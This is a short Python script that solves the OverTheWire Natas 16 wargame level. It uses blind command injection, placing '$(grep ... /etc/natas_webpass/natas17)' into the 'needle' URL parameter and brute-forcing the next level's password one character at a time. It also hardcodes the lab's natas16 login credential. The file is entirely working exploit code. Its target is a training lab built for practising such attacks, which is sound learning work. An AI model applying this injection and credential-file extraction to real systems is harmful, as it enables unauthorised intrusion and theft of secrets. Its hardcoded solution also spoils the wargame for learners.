#!/usr/env python2
import sys
import requests
import string
from requests.auth import HTTPBasicAuth

#$(grep a /etc/natas_webpass/natas17)whacked

MSG_ERROR = "whacked"

url = "http://natas16.natas.labs.overthewire.org/"
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passwd = ''
filtred = ''
for char in chars:

    a = requests.get(url + '?needle=$(grep '+char+' /etc/natas_webpass/natas17)whacked', auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
    if MSG_ERROR not in a.text:
        filtred = filtred +char
        print(filtred)


for i in range(0,32):
    for char in filtred:
        a = requests.get(url + '?needle=$(grep ^'+ passwd + char+' /etc/natas_webpass/natas17)whacked', auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if MSG_ERROR not in a.text:
            passwd = passwd + char
            print(passwd)
            sys.stdout.flush()
            break
        elif MSG_ERROR:
            sys.stdout.write('.')
            sys.stdout.flush()
            continue

